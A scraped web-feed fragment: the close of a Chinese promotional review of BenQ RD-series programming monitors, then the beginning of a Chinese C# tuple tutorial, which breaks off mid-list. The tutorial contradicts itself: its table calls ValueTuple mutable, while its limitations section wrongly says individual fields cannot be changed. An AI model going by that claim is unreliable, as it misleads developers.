<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6b2e9f7600e4d3a894f15b520095e54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=kAgA9Y8sufMDO36qNz4u0OrJ4Ks%3D" alt="" loading="lazy"/></p>
<p>明基的编程模式不是随便调个参数,而是真正把"<strong>深色 IDE + 长文阅读 + 夜间护眼</strong>"这三件程序员最在乎的事一次性解决到位。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d1c685ced3234264967d074b9251c681~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=2LSYdYd%2FAorl6tLTmvXnNvl%2FZ5E%3D" alt="" loading="lazy"/></p>
<p>我平时一边用 TRAE 写代码,一边 Chrome 开十几个标签看文档。以前 16:9 屏幕一屏最多看 40 行代码,滚动到吐。换了 3:2 之后,一屏能看 80 行!没错,垂直空间直接翻倍。改 Bug 的时候,上半屏看报错栈,下半屏直接改代码,完全不用来回滚动,效率肉眼可见地提升。更别提阅读 PDF 论文、看 API 文档,简直是降维打击。</p>
<h3 data-id="heading-8">然后是护眼,这才是让我最满意的部分。</h3>
<p>下图是明基的"抗反射"效果(强灯光下对比):</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f20bf9b50d454e72a21b7543f9dcaf7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=j0ho4VPYIOWuoYqRE1viOJi0E7o%3D" alt="" loading="lazy"/></p>
<p><em>左为明基显示器，强光照射下依旧字体清晰，右为我的普通显示器，强光照耀下不太可见字体。</em></p>
<p>RD 系列的面板做了特殊 AG 涂层,屏幕表面是非常细腻的雾面,不是普通显示器那种一看就有颗粒感的粗糙磨砂。我在屋顶灯和小灯全开的情况下,对着屏幕完全看不到灯泡的倒影!用其他显示器,晚上开灯写代码,屏幕里全是灯光和自己的倒影,难受得要死。</p>
<p>无论白天阳光多耀眼,晚上灯光多亮,屏幕都干净得像一块毛玻璃。再加上 95% P3 广色域 + 专业级色准(ΔE≤2),我偶尔调调 AI 生成的图片、做做 Keynote,颜色准得一批,不用额外调校。</p>
<p>关于夜间码字和码代码,我目前重度依赖的组合:</p>
<p><strong>编码模式</strong>(暖色温 + 超低亮度,晚上 12 点写代码也不刺眼)</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a30dc7f1c3094b99b785aa4b6df582d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=uWh0sqE017n9NwGoHplgtV1EvKs%3D" alt="" loading="lazy"/></p>
<p><strong>MoonHalo 背光</strong>(这才是神器</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0162024e69f4069ac85ef04c97b37d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=dY04mFPMu6wGVDk%2BibKK8ccGVaE%3D" alt="" loading="lazy"/></p>
<p>MoonHalo 是 RD 系列背部的环形背光灯,可以单独开关和调亮度。晚上关了大灯,只开 MoonHalo,屏幕背后有一圈柔和的偏暖光,既不会眩光,又能让眼睛在明暗交界处不那么疲劳。</p>
<p>我现在晚上写代码的仪式感就是:关灯 → 开 MoonHalo → 进入心流状态。</p>
<p>还有 DisplayPilot 2,彻底治好了我的折腾强迫症。</p>
<h3 data-id="heading-9">DisplayPilot 2 核心作用有这</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/680308bfdad043d5992c1349621d9307~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=A4RofAD7qpmjhuwRxo9KiTG97lA%3D" alt="" loading="lazy"/></p>
<ol>
<li>
<p><strong>一键切换显示器预设模式</strong>:通过这个应用直接在电脑上点一下,就能秒切编程模式、阅读模式、低蓝光、sRGB、P3 等十几个专业模式,比在显示器按键上翻菜单快十倍。</p>
</li>
<li>
<p><strong>场景快捷键(最爽的功能)</strong></p>
<ul>
<li>可以把"应用 + 画面模式 + 亮度/色温 + MoonHalo 背光开关"打包成一个场景。</li>
<li>我自己常用的:TRAE → 编码模式 + MoonHalo 开</li>
</ul>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c4117fcaafa4bf3a5a48b0f6828776f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=y4lARyeQ%2Bul8LEKl%2B6oqLTfQaKc%3D" alt="" loading="lazy"/></p>
<ul>
<li>深色 IDE 模式 + 亮度拉到最低,一秒切换,不用摸显示器按键,告别难用的显示器设置按键,快速切换场景,真实提效。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/294f9e55c01f4c449ac1513d105560fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=IV7jEbADf0%2F6xflULQ%2FhlcejpUA%3D" alt="" loading="lazy"/></p>
<p><strong>3.MoonHalo 背光灯单独控制:软件里可以独立开关和调亮度/色温,不用去摸显示器背后的实体按键。</strong></p>
<p>简单来讲,DisplayPilot 2 把 RD 系列显示器所有高级功能从"显示器按键深层菜单"解放到了"鼠标一点/键盘一按"。再配合 KVM 一起用,真的能把多设备工作效率拉高一个 level。</p>
<p>最后说一下我最在意的东西——支架和接口。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccdef9f340bf4bc2b872d10e9bb1e7e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWENhcHRhaW5v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764637233&amp;x-signature=Rl7qjWPIqjGwnwTXa3OGeN4Ly%2FE%3D" alt="" loading="lazy"/></p>
<p><strong>RD 系列的支架是我用过手感最好的显示器</strong> 升降、旋转、竖屏一气呵成,阻尼感满分。接口更是强大:90W 反向充电 Type-C × 2、HDMI、DP、KVM 专用 USB-B hub,扩展性无敌,完全不用专门买拓展坞。</p>
<p>写到这里,我现在看着屏幕都觉得舒服。</p>
<p>如果你也是代码党,真的可以闭眼入明基 RD 系列。</p>
<p>我只是……以前的显示器太难受了,现在终于解放了。</p>
<p>用过之后再回到普通显示器,感觉就像从机械键盘回到薄膜键盘——不是不能用,是实在回不去了。</p>
<p>如果你也是代码党,真的可以闭眼入明基 RD 系列，早入早享受～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一文理解 C#.NET Tuples：从基础到高级应用]]></title>    <link>https://juejin.cn/post/7576124206398357514</link>    <guid>https://juejin.cn/post/7576124206398357514</guid>    <pubDate>2025-11-24T23:07:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576124206398357514" data-draft-id="7576124206398341130" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一文理解 C#.NET Tuples：从基础到高级应用"/> <meta itemprop="keywords" content="C#,.NET"/> <meta itemprop="datePublished" content="2025-11-24T23:07:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="唐青枫"/> <meta itemprop="url" content="https://juejin.cn/user/3737995266234280"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一文理解 C#.NET Tuples：从基础到高级应用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3737995266234280/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    唐青枫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T23:07:14.000Z" title="Mon Nov 24 2025 23:07:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">简介</h3>
<p>元组是 <code>C#</code> 中用于存储一组固定数量、可能不同类型的值的数据结构。它是值类型（<code>ValueTuple</code>），在内存中分配于栈上（除非作为对象引用使用），因此性能较高。元组的主要用途是：</p>
<ul>
<li>
<p>临时组合数据，而无需创建专用类型。</p>
</li>
<li>
<p>从方法返回多个值。</p>
</li>
<li>
<p>在解构或模式匹配场景中简化代码。</p>
</li>
</ul>
<p><code>C#</code> 元组基于 <code>System.ValueTuple</code> 结构，引入于 <code>.NET Framework 4.7</code> 和 <code>.NET Core 2.0</code>。早期 <code>C#</code> 也支持 <code>System.Tuple</code>，但它是引用类型，性能较低且使用较繁琐，因此现代 <code>C#</code> 更推荐使用 <code>ValueTuple</code>。</p>
<h3 data-id="heading-1">元组类型演进</h3>
<h4 data-id="heading-2">传统 Tuple 类 (C# 4.0+)</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 引用类型，位于 System 命名空间</span>
Tuple&lt;<span class="hljs-built_in">int</span>, <span class="hljs-built_in">string</span>, <span class="hljs-built_in">bool</span>&gt; oldTuple = Tuple.Create(<span class="hljs-number">1</span>, <span class="hljs-string">"text"</span>, <span class="hljs-literal">true</span>);
Console.WriteLine(oldTuple.Item1); <span class="hljs-comment">// 访问元素</span>
</code></pre>
<h4 data-id="heading-3">现代 ValueTuple 结构 (C# 7.0+)</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 值类型，性能更好，语法更简洁</span>
(<span class="hljs-built_in">int</span> Id, <span class="hljs-built_in">string</span> Name, <span class="hljs-built_in">bool</span> Active) newTuple = (<span class="hljs-number">1</span>, <span class="hljs-string">"text"</span>, <span class="hljs-literal">true</span>);
Console.WriteLine(newTuple.Id); <span class="hljs-comment">// 使用命名元素访问</span>
</code></pre>
<h3 data-id="heading-4">两种元组对比</h3>








































<table><thead><tr><th>特性</th><th>Tuple</th><th>ValueTuple</th></tr></thead><tbody><tr><td>类型</td><td>引用类型（类）</td><td>值类型（结构体）</td></tr><tr><td>性能</td><td>堆分配</td><td>栈分配（通常）</td></tr><tr><td>语法</td><td>冗长</td><td>简洁</td></tr><tr><td>命名元素</td><td>仅 Item1, Item2...</td><td>支持自定义名称</td></tr><tr><td>可变性</td><td>不可变</td><td>可变</td></tr><tr><td>推荐使用</td><td>向后兼容</td><td>新开发项目</td></tr></tbody></table>
<h3 data-id="heading-5">ValueTuple 详细用法</h3>
<h4 data-id="heading-6">基本语法</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 隐式类型声明</span>
<span class="hljs-keyword">var</span> tuple = (<span class="hljs-number">1</span>, <span class="hljs-string">"hello"</span>, <span class="hljs-literal">true</span>);

<span class="hljs-comment">// 显式类型声明</span>
(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">string</span>, <span class="hljs-built_in">bool</span>) tuple = (<span class="hljs-number">1</span>, <span class="hljs-string">"hello"</span>, <span class="hljs-literal">true</span>);

<span class="hljs-comment">// 命名元素</span>
(<span class="hljs-built_in">int</span> Id, <span class="hljs-built_in">string</span> Name, <span class="hljs-built_in">bool</span> IsActive) person = (<span class="hljs-number">1</span>, <span class="hljs-string">"John"</span>, <span class="hljs-literal">true</span>);

<span class="hljs-comment">// 左侧命名</span>
<span class="hljs-keyword">var</span> person = (Id: <span class="hljs-number">1</span>, Name: <span class="hljs-string">"John"</span>, IsActive: <span class="hljs-literal">true</span>);
</code></pre>
<h4 data-id="heading-7">元素访问方式</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">var</span> person = (Id: <span class="hljs-number">1</span>, Name: <span class="hljs-string">"John"</span>, IsActive: <span class="hljs-literal">true</span>);

<span class="hljs-comment">// 通过名称访问</span>
Console.WriteLine(person.Name); <span class="hljs-comment">// "John"</span>

<span class="hljs-comment">// 通过位置访问（依然可用）</span>
Console.WriteLine(person.Item2); <span class="hljs-comment">// "John"</span>

<span class="hljs-comment">// 解构赋值</span>
<span class="hljs-keyword">var</span> (id, name, isActive) = person;
Console.WriteLine(name); <span class="hljs-comment">// "John"</span>

<span class="hljs-comment">// 部分解构</span>
<span class="hljs-keyword">var</span> (id, _, isActive) = person; <span class="hljs-comment">// 忽略第二个元素</span>
</code></pre>
<h4 data-id="heading-8">方法返回多个值</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 传统方式（out 参数）</span>
<span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">TryParse</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> input, <span class="hljs-keyword">out</span> <span class="hljs-built_in">int</span> result, <span class="hljs-keyword">out</span> <span class="hljs-built_in">string</span> error</span>)</span> {
    <span class="hljs-comment">// 解析逻辑</span>
}

<span class="hljs-comment">// 元组方式（更优雅）</span>
(<span class="hljs-built_in">int</span> Result, <span class="hljs-built_in">string</span> Error) TryParse(<span class="hljs-built_in">string</span> input) {
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">int</span>.TryParse(input, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> <span class="hljs-keyword">value</span>))
        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">value</span>, <span class="hljs-literal">null</span>);
    <span class="hljs-keyword">else</span>
        <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>, <span class="hljs-string">"Invalid number"</span>);
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">var</span> (result, error) = TryParse(<span class="hljs-string">"123"</span>);
<span class="hljs-keyword">if</span> (error == <span class="hljs-literal">null</span>)
    Console.WriteLine(<span class="hljs-string">$"Result: <span class="hljs-subst">{result}</span>"</span>);
</code></pre>
<h3 data-id="heading-9">高级特性与应用场景</h3>
<h4 data-id="heading-10">模式匹配 (C# 8.0+)</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">var</span> point = (X: <span class="hljs-number">5</span>, Y: <span class="hljs-number">10</span>);

<span class="hljs-comment">// 位置模式</span>
<span class="hljs-keyword">var</span> quadrant = point <span class="hljs-keyword">switch</span> {
    (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) =&gt; <span class="hljs-string">"原点"</span>,
    (<span class="hljs-keyword">var</span> x, <span class="hljs-keyword">var</span> y) <span class="hljs-keyword">when</span> x &gt; <span class="hljs-number">0</span> &amp;&amp; y &gt; <span class="hljs-number">0</span> =&gt; <span class="hljs-string">"第一象限"</span>,
    (<span class="hljs-keyword">var</span> x, <span class="hljs-keyword">var</span> y) <span class="hljs-keyword">when</span> x &lt; <span class="hljs-number">0</span> &amp;&amp; y &gt; <span class="hljs-number">0</span> =&gt; <span class="hljs-string">"第二象限"</span>,
    _ =&gt; <span class="hljs-string">"其他象限"</span>
};
</code></pre>
<h4 data-id="heading-11">LINQ 查询中的元组</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">var</span> people = <span class="hljs-keyword">new</span>[] { 
    (<span class="hljs-string">"John"</span>, <span class="hljs-number">25</span>), 
    (<span class="hljs-string">"Jane"</span>, <span class="hljs-number">30</span>), 
    (<span class="hljs-string">"Bob"</span>, <span class="hljs-number">25</span>) 
};

<span class="hljs-comment">// 分组查询</span>
<span class="hljs-keyword">var</span> grouped = people
    .GroupBy(p =&gt; p.Item2)  <span class="hljs-comment">// 按年龄分组</span>
    .Select(g =&gt; (Age: g.Key, Count: g.Count(), Names: g.Select(p =&gt; p.Item1)))
    .ToList();

<span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">in</span> grouped) {
    Console.WriteLine(<span class="hljs-string">$"Age: <span class="hljs-subst">{<span class="hljs-keyword">group</span>.Age}</span>, Count: <span class="hljs-subst">{<span class="hljs-keyword">group</span>.Count}</span>"</span>);
}
</code></pre>
<h4 data-id="heading-12">异步方法中的元组</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">async</span> Task&lt;(<span class="hljs-built_in">bool</span> Success, <span class="hljs-built_in">string</span> Data)&gt; FetchDataAsync() {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">var</span> data = <span class="hljs-keyword">await</span> httpClient.GetStringAsync(<span class="hljs-string">"api/data"</span>);
        <span class="hljs-keyword">return</span> (<span class="hljs-literal">true</span>, data);
    } <span class="hljs-keyword">catch</span> {
        <span class="hljs-keyword">return</span> (<span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);
    }
}

<span class="hljs-comment">// 使用</span>
<span class="hljs-keyword">var</span> (success, data) = <span class="hljs-keyword">await</span> FetchDataAsync();
<span class="hljs-keyword">if</span> (success) {
    ProcessData(data);
}
</code></pre>
<h3 data-id="heading-13">元组操作与转换</h3>
<h4 data-id="heading-14">元组比较</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">var</span> tuple1 = (<span class="hljs-number">1</span>, <span class="hljs-string">"hello"</span>);
<span class="hljs-keyword">var</span> tuple2 = (<span class="hljs-number">1</span>, <span class="hljs-string">"hello"</span>);

<span class="hljs-comment">// 值相等性比较</span>
<span class="hljs-built_in">bool</span> areEqual = tuple1 == tuple2; <span class="hljs-comment">// true</span>
<span class="hljs-built_in">bool</span> areNotEqual = tuple1 != tuple2; <span class="hljs-comment">// false</span>

<span class="hljs-comment">// 比较时考虑元素顺序</span>
<span class="hljs-keyword">var</span> tuple3 = (<span class="hljs-string">"hello"</span>, <span class="hljs-number">1</span>);
<span class="hljs-built_in">bool</span> areEqual2 = tuple1 == tuple3; <span class="hljs-comment">// false，顺序不同</span>
</code></pre>
<h4 data-id="heading-15">元组赋值与解构</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 多重赋值</span>
(<span class="hljs-built_in">int</span> x, <span class="hljs-built_in">int</span> y) = (<span class="hljs-number">10</span>, <span class="hljs-number">20</span>);

<span class="hljs-comment">// 交换变量（无需临时变量）</span>
(x, y) = (y, x);

<span class="hljs-comment">// 方法返回解构</span>
<span class="hljs-keyword">var</span> (min, max) = FindMinMax(numbers);

<span class="hljs-comment">// 与现有变量配合</span>
<span class="hljs-built_in">int</span> a = <span class="hljs-number">5</span>, b = <span class="hljs-number">10</span>;
(a, b) = (b, a); <span class="hljs-comment">// 交换值</span>
</code></pre>
<h4 data-id="heading-16">元组与集合的转换</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 元组列表</span>
List&lt;(<span class="hljs-built_in">int</span> Id, <span class="hljs-built_in">string</span> Name)&gt; people = <span class="hljs-keyword">new</span>() {
    (<span class="hljs-number">1</span>, <span class="hljs-string">"Alice"</span>),
    (<span class="hljs-number">2</span>, <span class="hljs-string">"Bob"</span>),
    (<span class="hljs-number">3</span>, <span class="hljs-string">"Charlie"</span>)
};

<span class="hljs-comment">// 转换为字典</span>
Dictionary&lt;<span class="hljs-built_in">int</span>, <span class="hljs-built_in">string</span>&gt; dict = people.ToDictionary(p =&gt; p.Id, p =&gt; p.Name);

<span class="hljs-comment">// 从集合创建元组</span>
<span class="hljs-keyword">var</span> stats = (Count: people.Count, AverageAge: people.Average(p =&gt; p.Id));
</code></pre>
<h3 data-id="heading-17">与其他特性的结合</h3>
<h4 data-id="heading-18">元组与记录类型</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 记录类型提供更正式的数据结构</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">record</span> <span class="hljs-title">Person</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> Id, <span class="hljs-built_in">string</span> Name, DateTime BirthDate</span>)</span>;

<span class="hljs-comment">// 元组适合临时、简单的数据组合</span>
(<span class="hljs-built_in">int</span> Id, <span class="hljs-built_in">string</span> Name) GetSimpleData() =&gt; (<span class="hljs-number">1</span>, <span class="hljs-string">"John"</span>);

<span class="hljs-comment">// 选择依据：是否需要行为方法、验证、继承等</span>
</code></pre>
<h4 data-id="heading-19">元组与 JSON 序列化</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// System.Text.Json 支持元组序列化</span>
<span class="hljs-keyword">var</span> tuple = (Id: <span class="hljs-number">1</span>, Name: <span class="hljs-string">"John"</span>);
<span class="hljs-built_in">string</span> json = JsonSerializer.Serialize(tuple);
<span class="hljs-comment">// 结果: {"Item1":1,"Item2":"John"} - 注意名称序列化</span>

<span class="hljs-comment">// 如果需要自定义名称，使用 JsonPropertyName</span>
[<span class="hljs-meta">Serializable</span>]
<span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> MyTuple {
    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">"id"</span>)</span>] <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Item1 { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">"name"</span>)</span>] <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Item2 { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
}
</code></pre>
<h3 data-id="heading-20">优势</h3>
<ul>
<li>
<p>简洁性：无需定义类或结构体即可快速组合多个值。</p>
</li>
<li>
<p>灵活性：支持不同类型的元素，且可以通过命名提高可读性。</p>
</li>
<li>
<p>性能：基于 <code>ValueTuple</code>，是值类型，分配在栈上，性能优于旧的 <code>System.Tuple</code>（引用类型）。</p>
</li>
<li>
<p>解构支持：与解构语法结合，简化变量赋值和数据提取。</p>
</li>
<li>
<p>方法返回值：方便从方法返回多个值，避免使用 <code>out</code> 参数或自定义类型。</p>
</li>
<li>
<p>与模式匹配结合：在 <code>switch</code> 表达式或 <code>is</code> 表达式中，元组可以用于模式匹配。</p>
</li>
</ul>
<h3 data-id="heading-21">限制</h3>
<ul>
<li>
<p>可读性问题：如果元组元素过多或命名不清晰，可能降低代码可读性。建议在复杂场景下使用类或结构体。</p>
</li>
<li>
<p>不可变性：元组是值类型，修改时需要重新赋值整个元组（不能直接修改某个字段）。</p>
</li>
<li>
<p>命名限制：编译器不会强制命名一致性。例如，<code>(x: 1, y: "test")</code> 和 <code>(a: 1, b: "test")</code> 被视为兼容类型，尽管名称不同。</p>
</li>
<li>
<p>序列化问题：元组不适合长期存储或序列化（如 <code>JSON</code>），因为它们是临时的、轻量级的数据结构。</p>
</li>
<li>
<p>与旧版兼容性：<code>C# 7.0</code> 之前的版本不支持 <code>ValueTuple</code>，需要引用 <code>System.ValueTuple</code> <code>NuGet</code> 包（在 <code>.NET Framework 4.6.2</code> 或更低版本中）。</p>
</li>
</ul>
<h3 data-id="heading-22">使用建议</h3>
<h4 data-id="heading-23">何时使用元组：</h4>
<ul>
<li>
<p>需要临时组合少量数据。</p>
</li>
<li>
